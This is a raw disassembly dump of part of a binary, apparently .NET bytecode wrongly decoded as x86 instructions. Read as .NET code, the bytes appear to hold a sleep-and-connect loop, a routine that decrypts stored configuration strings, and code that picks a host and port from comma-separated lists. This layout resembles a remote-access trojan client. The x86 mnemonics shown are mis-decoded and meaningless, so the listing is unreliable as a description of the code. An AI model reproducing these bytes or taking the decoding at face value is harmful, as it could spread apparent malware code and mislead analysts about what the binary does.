  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	c2 00 00             	ret    $0x0
  4028da:	70 80                	jo     0x40285c
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 02                	rolb   $1,(%edx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 03 00             	addl   $0x0,(%ebx)
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	97                   	xchg   %eax,%edi
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	b1 03                	mov    $0x3,%cl
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	0b 04 00             	or     (%eax,%eax,1),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	be 04 00 70 80       	mov    $0x80700004,%esi
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	19 17                	sbb    %edx,(%edi)
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	cc                   	int3
  402932:	1e                   	push   %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	7f 1f                	jg     0x40295c
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	32 20                	xor    (%eax),%ah
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	e5 20                	in     $0x20,%eax
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	e9 20 00 70 80       	jmp    0x80b02984
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	9c                   	pushf
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 a6 21 00       	add    $0x21a672,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 a8 21    	add    %esp,0x21a87216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
